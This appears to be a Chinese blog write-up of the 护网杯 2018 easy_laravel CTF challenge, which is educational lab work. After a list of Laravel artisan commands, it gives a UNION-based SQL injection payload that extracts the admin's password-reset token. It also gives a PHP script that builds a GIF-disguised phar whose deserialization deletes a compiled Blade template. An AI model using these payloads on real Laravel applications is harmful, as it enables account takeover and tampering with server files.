---
title: '[护网杯 2018]easy_laravel'
author: Troy3e
avatar: 'https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/QQ%E5%9B%BE%E7%89%8720210308190505.jpg'
authorAbout: SteamID：888007034
authorDesc: Blizzard：TroyeSivan#51769
categories: 技术
comments: true
date: 2021-04-20 21:24:26
authorLink:
tags:
keywords:
description:
photos: https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-1141980.jpg
---
题目注释里的链接已经挂了，BUU直接给了源码，拉下来composer install生成vendor目录。（没换源的话可能会连接超时）

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210420160758.png)

Artisan是Laravel自带的命令接口。
php artisan list可以查看php artisan 命令列表：

    命令  说明  备注
    php artisan make:resource ? 创建api返回格式化资源    >=5.4版本可用
    php artisan make:rule ? 创建validate规则    >=5.4版本可用
    php artisan make:exception ?    创建异常类   >=5.4版本可用
    php artisan make:factory ?  创建工厂类   >=5.4版本可用
    php artisan package:discover    重置包的缓存信息    >=5.4版本可用
    php artisan storage:link ？  Create a symbolic link from "public/storage" to "storage/app/public"    >=5.4版本可用
    php artisan view:clear  清楚所有已编译的视图文件    >=5.4版本可用
     
    php artisan clear-compiled  清除编译后的类文件   
    php artisan down    使应用程序进入维修模式 
    php artisan up  退出应用程序的维护模式 
    php artisan env 显示当前框架环境    
    php artisan fresh   清除包含框架外的支架  
    php artisan help    显示命令行的帮助    
    php artisan list    列出命令    
    php artisan migrate 运行数据库迁移 
    php artisan env 显示当前框架环境    
    php artisan optimize    为了更好的框架去优化性能    
    php artisan serve   在php开发服务器中服务这个应用    --port 8080，--host 0.0.0.0
    php artisan tinker  在应用中交互  
    php artisan app:name ?  设置应用程序命名空间
    php artisan auth:clear-resets   清除过期的密码重置密钥 未使用过
    php artisan cache:clear 清除应用程序缓存    
    php artisan cache:table 创建一个缓存数据库表的迁移   
    php artisan config:cache    创建一个加载配置的缓存文件   
    php artisan config:clear    删除配置的缓存文件   
    php artisan db:seed 数据库生成模拟数据   
    php artisan event:generate  生成event和listen  需要实现配置eventserviceprivoder
    php artisan make:command ?  创建一个新的命令处理程序类   
    php artisan make:console ?  生成一个Artisan命令   
    php artisan key:generate    设置程序密钥  
    php artisan make:controller ?   生成一个资源控制类   
    php artisan make:middleware ?   生成一个中间件 
    php artisan make:migration ?    生成一个迁移文件    
    php artisan make:model ?    生成一个Eloquent 模型类    
    php artisan make:provider ? 生成一个服务提供商的类 
    php artisan make:request ?  生成一个表单消息类   
    php artisan migrate:install ?   创建一个迁移库文件   
    php artisan make:migration ?    生成一个迁移文件    
    php artisan migrate:refresh ?   复位并重新运行所有的迁移    
    php artisan migrate:reset ? 回滚全部数据库迁移   
    php artisan migrate:rollback ?  回滚最后一个数据库迁移 
    php artisan migrate:status  显示列表的迁移 
    php artisan queue:failed    列出全部失败的队列工作 
    php artisan queue:failed-table ?    创建一个迁移的失败的队列数据库工作表  
    php artisan queue:flush 清除全部失败的队列工作 
    php artisan queue:forget ?  删除一个失败的队列工作 
    php artisan queue:listen ?  监听一个确定的队列工作
    php artisan queue:restart   重启现在正在运行的所有队列工作 
    php artisan queue:retry 重试一个失败的队列工作 
    php artisan queue:subscribe 订阅URL,放到队列上 
    php artisan queue:table 创建一个迁移的队列数据库工作表 
    php artisan queue:work  进行下一个队列任务
    php artisan route:cache 为了更快的路由登记，创建一个路由缓存文件    
    php artisan route:clear 清除路由缓存文件    
    php artisan route:list  列出全部的注册路由   
    php artisan schedule:run    运行预定命令  
    php artisan session:table   创建一个迁移的SESSION数据库工作表    
    php artisan vendor:publish  发表一些可以发布的有用的资源来自提供商的插件包 
    baum包命令
    命令  说明  备注
    php artisan baum    Get Baum version notice.    
    php artisan baum:install ?  Scaffolds a new migration and model suitable for Baum   

使用php artisan route:list查看一下已经定义的路由：

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210420162104.png)

或者也可以直接在routers/web.php里查看：

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210420162158.png)

具体的路由可以在 Illuminate/Routing/Router.php 中找到

可以看到基本所有操作都需要登录，先看UploadController 和 FlagController，两个都使用了一个叫做 admin 的中间件。
在 app/Http/Middleware/AdminMiddleware.php 中可以看到代码：

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210420193710.png)

看到了管理员的邮箱，尝试新注册一个覆盖：

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210420193741.png)

显示已经注册。
不行，那就想办法获取管理员的账号密码。
NoteController这里似乎有个sql注入：

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210420194521.png)

这里我试了一会儿都是直接报错，没办法注入，可能是环境的变化？

————————
后记：列数错了，没仔细看。。。

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210420202150.png)

事实上这里也无法注出管理员密码，在database/factories/ModelFactory.php里，告诉了我们这里就算注出来密码也是加过密的。

但是在laravel5.4中，重置密码的操作很有意思 Illuminate\Auth\Passwords\PasswordBroker.php
首先是发送重置链接的方法

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210420203800.png)

如果用户存在的话，会有个token，这里跟进一下create。什么？这是notepad？那没事了，phpStorm启动！

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210420204953.png)

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210420210041.png)

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210420210140.png)

这里直接把新生成的token写入了数据库中。
总结一下：向管理员邮箱发送重置密码的请求，同时生成一个token存入数据库。随便注册一个账号，然后注出更改密码的token，最后实现直接更改管理员的密码。
发送重置请求：

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210420220741.png)

返回500是成功发送。
注册个新号注出token：42e06b61aa3a3206902b46785c9744e1bb0e07de494bfe74b65ee8f7217377af

    Troy3e' union select 1,token,3,4,5 from password_resets order by created_at desc limit 1-- -

记得按时间排序：

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210420221157.png)

重置管理员密码：

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210420221335.png)

成功进入：

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210420221402.png)

照理说访问flag应该出flag，但是没有：

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210420221912.png)

这里需要学习一下blade：
Blade 是由 Laravel 提供的非常简单但功能强大的模板引擎，不同于其他流行的 PHP 模板引擎，Blade 在视图中并不约束你使用 PHP 原生代码。
所有的 Blade 视图最终都会被编译成原生 PHP 代码并缓存起来直到被修改，这意味着对应用的性能而言 Blade 基本上是零开销。
Blade 视图文件使用 .blade.php 文件扩展并存放在 resources/views 目录下。
这是因为模板编译后的文件没有删除而导致无法显示flag，因此需要删除编译后的模板文件，所以需要知道编译后的文件名（Illuminate\View\Compilers\Compiler.php）：

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210420223953.png)

编译后文件的路径由两部分构成第一部分是模板的绝对路径path，第二部分是是缓存路径，又因为缓存路径为/storage/framework/views/，其中/usr/share/nginx/html/是nginx的默认web路径，由提示的得到，path为/usr/share/nginx/html/resources/views/auth/flag.blade.php的sha1值

即可以得到编译后的文件的路径：

/usr/share/nginx/html/storage/framework/views/34e41df0934a75437873264cd28e2d835bc38772.php

那么接下来要做的就是删掉这个文件。看到旁边还有个上传功能：

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210420234714.png)

上传成功则传到app/public，并且下面check函数存在file_exists函数，可以触发phar反序列化。
然后寻找删除文件的地方，全局搜索__destruct：

swiftmailer/swiftmailer/lib/classes/Swift/ByteStream/TemporaryFileByteStream.php

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210421000007.png)

正是我们要寻找的删除函数。

exp:

    <?php
        include('autoload.php');
        $a = serialize(new Swift_ByteStream_TemporaryFileByteStream());
        var_dump(unserialize($a));
        var_dump($a);
        $a = preg_replace('/\/tmp\/FileByteStream[\w]{6}/', "/usr/share/nginx/html/storage/framework/views/34e41df0934a75437873264cd28e2d835bc38772.php", $a); //将其换成要删除的文件名
        $a = str_replace('s:25', 's:90', $a);   //修改对应的序列化数据长度
        var_dump($a);
        $b = unserialize($a);
    
        $p = new Phar('./tr1ple.phar', 0);
        $p->startBuffering();
        $p->setStub('GIF89a<?php __HALT_COMPILER(); ?>');
        $p->setMetadata($b);
        $p->addFromString('test.txt','text');
        $p->stopBuffering();
        rename('tr1ple.phar', 'tr1ple.gif')
    ?>

但是这个在BUU上是打不通的，我仔细对比了buu给的exp和网上复现wp的区别，发现是缓存文件地址的不同，所以用网上的那个是没法成功删掉缓存文件的。exp就不放了，BUU贴出来了，链接在下面。

想了想可能是这个导致的：

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210421010359.png)

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210421010708.png)

不去深究了，理解就行。

复现思路：
https://www.cnblogs.com/tr1ple/p/11044313.html
https://github.com/CTFTraining/huwangbei_2018_easy_laravel/blob/master/exp/easy_laravel_exp.py
https://www.codercto.com/a/31804.html
